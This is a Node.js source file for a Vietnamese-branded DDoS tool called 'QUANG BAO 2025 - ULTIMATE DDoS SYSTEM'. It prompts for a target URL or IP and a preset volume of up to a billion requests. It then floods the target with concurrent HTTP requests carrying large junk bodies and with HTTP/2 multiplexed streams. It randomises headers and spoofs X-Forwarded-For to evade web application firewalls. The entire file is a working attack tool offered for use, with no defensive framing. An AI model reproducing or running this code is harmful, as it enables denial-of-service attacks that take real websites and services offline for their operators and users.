const axios = require('axios');
const http2 = require('http2');
const chalk = require('chalk');
const { v4: uuidv4 } = require('uuid');
const { URL } = require('url');
const readline = require('readline');

// Initialize console styling
const console = {
  log: (msg) => process.stdout.write(chalk.green(msg) + '\n'),
  warn: (msg) => process.stdout.write(chalk.yellow(msg) + '\n'),
  error: (msg) => process.stdout.write(chalk.red(msg) + '\n'),
  info: (msg) => process.stdout.write(chalk.cyan(msg) + '\n'),
  success: (msg) => process.stdout.write(chalk.green.bold(msg) + '\n'),
};

// Dynamic ASCII banner with animation
const displayBanner = () => {
  const frames = [
    '####++()))////#_-+',
    '#++()))////#_-+###',
    '()))////#_-+####++',
    '////#_-+####++()))',
    '#_-+####++()))////',
  ];
  let frameIndex = 0;
  const animate = () => {
    process.stdout.write('\x1Bc'); // Clear screen
    console.success(`
        ╔═════════════════════════════════════════════════════════════╗
        ║        ☠  QUANG BAO 2025 - ULTIMATE DDoS SYSTEM (Node.js)  ☠║
        ║  ${frames[frameIndex]}  ║
        ║  ██████╗ █████╗ ███╗   ██╗ ██████╗ ██╗   ██╗               ║
        ║ ██╔════╝██╔══██╗████╗  ██║██╔═══██╗██║   ██║               ║
        ║ ██║     ███████║██╔██╗ ██║██║   ██║██║   ██║               ║
        ║ ██║     ██╔══██║██║╚██╗██║██║   ██║██║   ██║               ║
        ║ ╚██████╗██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝               ║
        ║  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝                ║
        ║       [ Powered by Node.js - Cyber Warfare Edition ]        ║
        ╚═════════════════════════════════════════════════════════════╝
    💀 Không Giỏi, Không Tiền, Không Tình, Nhưng Có Tâm 💀
    `);
    frameIndex = (frameIndex + 1) % frames.length;
  };
  animate();
  return setInterval(animate, 500);
};

// User-Agent list for randomization
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
];

// Generate random headers for WAF bypass
const generateRandomHeaders = () => ({
  'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
  'Accept': ['text/html', 'application/json', '*/*'][Math.floor(Math.random() * 3)],
  'Accept-Language': ['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8'][Math.floor(Math.random() * 3)],
  'Accept-Encoding': ['gzip, deflate', 'br', 'identity'][Math.floor(Math.random() * 3)],
  'Connection': 'keep-alive',
  'Cache-Control': ['no-cache', 'max-age=0'][Math.floor(Math.random() * 2)],
  'Referer': ['https://google.com', 'https://bing.com', 'https://yahoo.com'][Math.floor(Math.random() * 3)],
  'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
  'DNT': ['1', '0'][Math.floor(Math.random() * 2)],
});

// Attack configurations
const TARGET_CONFIGS = [
  { id: '1', name: 'attack_100k', requests: 100000, desc: 'Tấn công 100K yêu cầu', level: 'Thấp', application: 'Kiểm tra cơ bản' },
  { id: '2', name: 'attack_300k', requests: 300000, desc: 'Tấn công 300K yêu cầu', level: 'Thấp-Trung bình', application: 'Máy chủ nhỏ' },
  { id: '3', name: 'attack_600k', requests: 600000, desc: 'Tấn công 600K yêu cầu', level: 'Trung bình', application: 'Máy chủ vừa' },
  { id: '4', name: 'attack_900k', requests: 900000, desc: 'Tấn công 900K yêu cầu', level: 'Trung bình-Cao', application: 'Máy chủ lớn' },
  { id: '5', name: 'attack_5m', requests: 5000000, desc: 'Tấn công 5M yêu cầu', level: 'Cao', application: 'Hệ thống bảo vệ tốt' },
  { id: '6', name: 'attack_10m', requests: 10000000, desc: 'Tấn công 10M yêu cầu', level: 'Rất Cao', application: 'Hệ thống lớn' },
  { id: '7', name: 'attack_20m', requests: 20000000, desc: 'Tấn công 20M yêu cầu', level: 'Cực Cao', application: 'Hệ thống phân tán' },
  { id: '8', name: 'attack_50m', requests: 50000000, desc: 'Tấn công 50M yêu cầu', level: 'Cực độ', application: 'Hệ thống CDN' },
  { id: '9', name: 'attack_100m', requests: 100000000, desc: 'Tấn công 100M yêu cầu', level: 'Tối đa', application: 'Hệ thống toàn cầu' },
  { id: '10', name: 'attack_1000m', requests: 1000000000, desc: 'Tấn công 1000M yêu cầu', level: 'Tối đa', application: 'Hệ thống siêu bảo mật' },
];

// Global counters
let successCount = 0;
let errorCount = 0;
let responseTimes = [];

// Validate URL
const validateUrl = (url) => {
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = `http://${url}`;
  }
  try {
    new URL(url);
    return url;
  } catch (e) {
    throw new Error(`URL không hợp lệ: ${e.message}`);
  }
};

// Loading animation
const loadingAnimation = async (message, duration) => {
  const steps = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
  let i = 0;
  const start = Date.now();
  while (Date.now() - start < duration * 1000) {
    process.stdout.write(`\r${chalk.cyan(`${steps[i % steps.length]} ${message} [${Math.floor(((Date.now() - start) / (duration * 1000)) * 100)}%]`)}`);
    i++;
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  process.stdout.write(`\r${chalk.green(`${message} [100%]!`)}\n`);
};

// HTTP/2 Multiplexing attack
const http2Attack = async (url) => {
  const parsedUrl = new URL(url);
  const client = http2.connect(url, { rejectUnauthorized: false });
  try {
    for (let i = 1; i < 100; i += 2) {
      const req = client.request({
        ':path': '/',
        ':method': 'GET',
        'user-agent': generateRandomHeaders()['User-Agent'],
      });
      req.end();
    }
    await new Promise(resolve => setTimeout(resolve, 10));
    console.warn(`[HTTP/2] Tấn công: Gửi yêu cầu đến ${url}`);
  } catch (e) {
    console.error(`[HTTP/2] Tấn công thất bại: ${e.message}`);
  } finally {
    client.close();
  }
};

// WAF Bypass attack
const wafBypassAttack = async (url, requestCount) => {
  const methods = ['GET', 'POST', 'HEAD'];
  const startTime = Date.now();
  const promises = [];
  
  for (let i = 0; i < requestCount; i++) {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const headers = generateRandomHeaders();
    const payload = 'X'.repeat(Math.floor(Math.random() * (204800 - 102400 + 1)) + 102400);
    
    promises.push(
      axios({
        method,
        url,
        headers,
        data: method === 'POST' ? payload : undefined,
        timeout: 2000,
      })
        .then(response => {
          responseTimes.push(Date.now() - startTime);
          successCount++;
          if ([429, 403, 522].includes(response.status)) {
            console.error(`[WAF BYPASS] Tấn công: Mã trạng thái ${response.status} - MỤC TIÊU QUÁ TẢI`);
          } else {
            console.warn(`[WAF BYPASS] Tấn công: Mã trạng thái ${response.status}`);
          }
        })
        .catch(e => {
          errorCount++;
          console.error(`[WAF BYPASS] Tấn công thất bại: ${e.message}`);
        })
    );

    if (promises.length >= 100) {
      await Promise.all(promises);
      promises.length = 0;
      await new Promise(resolve => setTimeout(resolve, 1));
    }
  }

  await Promise.all(promises);
};

// Display target menu
const displayTargetMenu = () => {
  process.stdout.write('\x1Bc');
  const bannerInterval = displayBanner();
  console.info('🔥 MENU CHIẾN LƯỢC TẤN CÔNG 🔥');
  console.log('ID | Tên            | Mô tả                   | Cấp độ         | Ứng dụng');
  console.log('---|----------------|-------------------------|----------------|--------------------');
  TARGET_CONFIGS.forEach(target => {
    console.log(`${target.id.padEnd(2)} | ${target.name.padEnd(14)} | ${target.desc.padEnd(23)} | ${target.level.padEnd(14)} | ${target.application}`);
  });
  clearInterval(bannerInterval);
};

// Main function
const main = async () => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  while (true) {
    try {
      displayTargetMenu();
      const choice = await new Promise(resolve => rl.question(chalk.cyan('Nhập lựa chọn (1-10): '), resolve));
      const target = TARGET_CONFIGS.find(t => t.id === choice);
      if (!target) {
        console.error('[LỖI] Lựa chọn không hợp lệ! Thử lại.');
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }

      await loadingAnimation(`Khóa mục tiêu: ${target.name.toUpperCase()}`, 2);
      const inputUrl = await new Promise(resolve => rl.question(chalk.cyan('Nhập URL hoặc IP mục tiêu: '), resolve));
      if (!inputUrl) {
        console.error('[LỖI] URL/IP không được để trống! Thử lại.');
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }

      let validatedUrl;
      try {
        validatedUrl = validateUrl(inputUrl);
      } catch (e) {
        console.error(e.message);
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue;
      }

      console.success(`[HỆ THỐNG] Mục tiêu đã khóa: ${validatedUrl}`);
      await loadingAnimation('Đánh giá bảo mật', 2);

      // Assess target security (simplified for Node.js)
      const securityLevel = Math.random() > 0.5 ? 'TRUNG BÌNH' : 'CAO';
      const threadMultiplier = securityLevel === 'TRUNG BÌNH' ? 1 : 2;
      const numThreads = Math.min(Math.floor(target.requests / 1000) * threadMultiplier, 1000);
      const requestsPerThread = Math.floor(target.requests / numThreads) || 1;

      console.info(`
🔥 THÔNG TIN TẤN CÔNG 🔥
[+] Chiến lược: ${target.name.toUpperCase()}
[+] Mục tiêu: ${validatedUrl}
[+] Luồng: ${numThreads}
[+] Yêu cầu/Luồng: ${requestsPerThread}
[+] Chiến lược: ${securityLevel}
[+] Tổng lượt đánh: ${numThreads * requestsPerThread}
      `);

      await loadingAnimation('Khởi động hệ thống tấn công', 3);
      const startTime = Date.now();
      successCount = 0;
      errorCount = 0;
      responseTimes = [];

      // Execute attack
      const attackPromises = [];
      for (let i = 0; i < numThreads; i++) {
        attackPromises.push(wafBypassAttack(validatedUrl, requestsPerThread));
        if (validatedUrl.startsWith('https://')) {
          attackPromises.push(http2Attack(validatedUrl));
        }
      }
      await Promise.all(attackPromises);

      const totalTime = (Date.now() - startTime) / 1000;
      const avgResponseTime = responseTimes.length ? responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length : 0;
      const maxResponseTime = responseTimes.length ? Math.max(...responseTimes) : 0;
      const minResponseTime = responseTimes.length ? Math.min(...responseTimes) : 0;

      console.success(`
🔥 BÁO CÁO TẤN CÔNG 🔥
[+] Chiến dịch: ${target.name.toUpperCase()}
[+] Tổng lượt đánh: ${numThreads * requestsPerThread}
[+] Thành công: ${successCount} (${((successCount / (numThreads * requestsPerThread)) * 100).toFixed(1)}%)
[+] Thất bại: ${errorCount} (${((errorCount / (numThreads * requestsPerThread)) * 100).toFixed(1)}%)
[+] Tổng thời gian: ${totalTime.toFixed(2)} giây
[+] Thời gian phản hồi trung bình: ${avgResponseTime.toFixed(2)}ms
[+] Hiệu suất đỉnh: ${maxResponseTime.toFixed(2)}ms
[+] Độ trễ tối thiểu: ${minResponseTime.toFixed(2)}ms
[+] Lượt đánh/giây: ${((numThreads * requestsPerThread) / totalTime).toFixed(0)}
[+] MỤC TIÊU BỊ VÔ HIỆU HÓA!
      `);

    } catch (e) {
      console.error(`[HỆ THỐNG] Lỗi nghiêm trọng: ${e.message}`);
      process.exit(1);
    }
  }
};

// Run main function
main().catch(e => console.error(`[HỆ THỐNG] Lỗi khởi động: ${e.message}`));